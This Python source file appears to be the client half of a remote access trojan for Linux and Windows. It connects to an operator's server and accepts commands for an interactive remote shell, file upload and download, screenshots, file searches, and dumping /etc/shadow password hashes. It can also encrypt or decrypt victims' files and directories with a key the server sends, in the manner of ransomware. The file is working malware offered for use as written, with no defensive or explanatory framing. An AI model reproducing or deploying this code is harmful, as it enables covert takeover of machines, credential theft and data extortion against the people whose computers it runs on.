#!/usr/bin/python3
from sys import argv
from platform import system as find_system
import os
from os.path import isfile, isdir
from subprocess import check_output, DEVNULL, PIPE, run, Popen
from secure_socket import Client, HOSTNAME
import ipaddress
from aes_cbc_256 import AES_CBC_256

class Computer:
  def shell(self, socket):
    origin=os.getcwd() # save original path for later
    socket.send(self.get_prompt()) # send prompt to server
    cmd=socket.receive()
    while cmd != 'exit':
      out=b''
      try:
        if cmd=="cd": # if cd alone, go to home
          os.chdir(self.get_env()[1])
        elif cmd.startswith("cd ") and len(cmd[3:].strip())>0: # if cd with path
          os.chdir(cmd[3:].strip()) # go to path
        else: # else run command
          output = run(cmd.split(' '), check=False, stdout=PIPE, stderr=PIPE, timeout=5)
          out=output.stdout
          err=output.stderr
          out=out+err # concat stdout and stderr
      except Exception as e:
        out=e
      # send output to server, even if it's an error
      # * is separator between prompt and output
      socket.send(b"*".join([self.get_prompt().encode(), out]), as_bytes=True)
      cmd=socket.receive()
    # go back to original path
    os.chdir(origin)

  def screenshot(self,filename):
    file_path = f'{os.getcwd()}/{filename}'
    try:
      import pyscreenshot
      screenshot = pyscreenshot.grab()
      screenshot.save(file_path)
    except ModuleNotFoundError:
      with open(file_path, 'w') as file:
        file.write("ModuleNotFoundError: No module named 'pyscreenshot'")
    return file_path

class Linux(Computer):
  def ipconfig(self):
    return check_output(["ip", "a"]).decode('utf-8')

  def hashdump(self):
    if os.access('/etc/shadow', os.R_OK): # check for reading rights
      return check_output(["cat", "/etc/shadow"]).decode('utf-8')
    else:
      socket.send("You don't have permission for it.")
  

  def get_env(self):
    user=os.getlogin()
    path=os.getcwd()
    if user=='root':
      home='/root'
      end="#"
    else:
      home=f'/home/{user}'
      end="$"
    return [user, home, path, end] # return environment info
  
  def get_prompt(self):
    user, home, path, end = self.get_env()
    if path.startswith(home):
      path=home.join(path.split(home)[1:])
      path=f"~{path}" # append tilde if in home directory
    return f"[{user}@{HOSTNAME}:{path}] {end} " # concat envrironment info into prompt
  
  def search(self, filename, path):
      return run(['find', path, '-name', filename], stderr=DEVNULL, stdout=PIPE).stdout.decode("utf-8").strip()
    
class Windows(Computer):
  def ipconfig(self):
    return check_output(["ipconfig"]).decode('latin-1')
  
  def get_env(self):
    user=os.getlogin()
    path=os.getcwd()
    home='C:\\'
    end=">"
    return [user, home, path, end] # same as linux
  
  def get_prompt(self):
    _, _, path, end = self.get_env()
    return f"{path}{end} "
  
  def hashdump(self):
    return socket.send("Send hashdump .... please wait")
  

  def search(self,filename, path):
    # https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/dir
    command = 'dir /s /b ' + path + filename
    result =  run(command, stdout=PIPE, stderr=DEVNULL, shell=True)
    if result.returncode == 0:
        output = result.stdout.decode('latin-1')
        return output

def download(socket):
  # knowing * char is not allowed in filenames, it can be used as separator.
  filename_src, filename_dst=socket.receive().split('*')
  if os.path.isfile(filename_src):
    socket.send('ok')
    socket.send_file(filename_src, filename_dst)
  else:
    socket.send('File not found.')

def encrypt(socket):
  socket.send(HOSTNAME)
  key=socket.receive(as_bytes=True)
  aes=AES_CBC_256(key)
  filename=socket.receive()
  if isfile(filename):
    aes.encrypt_file(filename)
  elif isdir(filename):
    aes.encrypt_dir(filename)
  socket.send('done.')

def decrypt(socket):
  socket.send(HOSTNAME)
  key=socket.receive(as_bytes=True)
  aes=AES_CBC_256(key)
  filename=socket.receive()
  if isfile(filename):
    aes.decrypt_file(filename)
  elif isdir(filename):
    aes.decrypt_dir(filename)
  socket.send('done.')

if __name__ == "__main__":
  host="127.0.0.1"
  try:
    # verify ip is valid
    ipaddress.ip_address(argv[1])
    host=argv[1]
  except:
    print("The IP adress is not valid.")
    exit(1)
  
  system=None
  match find_system():
    case "Linux":
      system=Linux()
    case "Windows":
      system=Windows()
    case _:
      exit('OS not supported.')
  
  try:
    socket=Client(host=host)
  except:
    exit("Server unreachable.")
  
  # list existing commands that can be used on the server
  using=True
  while using:
    match socket.receive():
      case "ip":
        socket.send(system.ipconfig())
      case "shell":
        system.shell(socket)
      case "upload":
        socket.receive_file()
      case "download":
        download(socket)
      case "hashdump":
        socket.send(system.hashdump())
      case "search":
        filename, path = socket.get_params()
        socket.send(system.search(filename,path))
      case "screenshot":
        filename = socket.get_params()
        cleaned_filename = f'{filename[0]}.png'
        socket.send_file(system.screenshot(cleaned_filename),cleaned_filename)
        os.remove(cleaned_filename)
      case "delete":
        using=False
      case "encrypt":
        encrypt(socket)
      case "decrypt":
        decrypt(socket)
      case _:
        pass
  socket.disconnect()
